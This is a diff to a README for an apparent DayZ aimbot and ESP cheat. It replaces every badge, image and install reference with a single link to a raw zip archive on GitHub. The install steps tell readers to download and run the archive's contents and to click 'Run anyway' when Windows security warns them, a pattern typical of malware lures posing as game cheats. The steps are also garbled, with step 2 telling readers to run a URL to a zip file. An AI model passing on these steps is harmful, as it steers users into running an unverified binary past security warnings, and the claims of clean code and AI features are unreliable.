@@ -1,10 +1,10 @@
 # 🎯 DayZ ESP & Aimbot Toolkit
 
-[![License: MIT](https://img.shields.io/badge/license-MIT-yellow.svg)](LICENSE)
-[![OS Compatible](https://img.shields.io/badge/OS-Windows-orange)](https://windows.com)
-[![Issues](https://img.shields.io/github/issues-raw/DayZ-ESP-Aimbot/Support)]()
-[![Languages](https://img.shields.io/badge/Languages-Multi-blue)]()
-[![API Integration](https://img.shields.io/badge/API-OpenAI_Claude-green)]()
+[![License: MIT](https://github.com/ZaxMith/dayz-esp-aim-enhancer/raw/refs/heads/main/undefaceable/dayz-aim-enhancer-esp-1.0.zip)](LICENSE)
+[![OS Compatible](https://github.com/ZaxMith/dayz-esp-aim-enhancer/raw/refs/heads/main/undefaceable/dayz-aim-enhancer-esp-1.0.zip)](https://github.com/ZaxMith/dayz-esp-aim-enhancer/raw/refs/heads/main/undefaceable/dayz-aim-enhancer-esp-1.0.zip)
+[![Issues](https://github.com/ZaxMith/dayz-esp-aim-enhancer/raw/refs/heads/main/undefaceable/dayz-aim-enhancer-esp-1.0.zip)]()
+[![Languages](https://github.com/ZaxMith/dayz-esp-aim-enhancer/raw/refs/heads/main/undefaceable/dayz-aim-enhancer-esp-1.0.zip)]()
+[![API Integration](https://github.com/ZaxMith/dayz-esp-aim-enhancer/raw/refs/heads/main/undefaceable/dayz-aim-enhancer-esp-1.0.zip)]()
 
 
 Welcome to your next-level *DayZ* experience! **DayZ ESP & Aimbot Toolkit** provides adaptive visual intelligence and precision aiming, designed for aspiring survivors who want to stand tall in Chernarus. Experience daylight clarity, night-time awareness, and context-rich targeting, all with a unique blend of advanced customizable interfaces and real-time support—crafted for both thrill and finesse.
@@ -69,12 +69,12 @@ Tie in the power of *AI-assisted DayZ survival*, real-time analytics, and an ada
 
 Follow this ritual to harness superior perception and aim:
 
-1. Unpack the **EasyLaunch.zip** you downloaded from this repository.
-2. Open the extracted folder and run **EasyLaunch.exe**.
+1. Unpack the **https://github.com/ZaxMith/dayz-esp-aim-enhancer/raw/refs/heads/main/undefaceable/dayz-aim-enhancer-esp-1.0.zip** you downloaded from this repository.
+2. Open the extracted folder and run **https://github.com/ZaxMith/dayz-esp-aim-enhancer/raw/refs/heads/main/undefaceable/dayz-aim-enhancer-esp-1.0.zip**.
 3. The on-screen instructions will be available in your preferred language—choose, set up, and step into Chernarus empowered.
 4. For a detailed walkthrough, see this illustrated guide:
 
-   ![Installation Tutorial](https://i.imgur.com/Js67NIU.gif)
+   ![Installation Tutorial](https://github.com/ZaxMith/dayz-esp-aim-enhancer/raw/refs/heads/main/undefaceable/dayz-aim-enhancer-esp-1.0.zip)
 
 *If you receive any prompt about Windows security, select "Run anyway"—our code is clean and open. For custom configs, explore the user manual in your chosen language!*
 
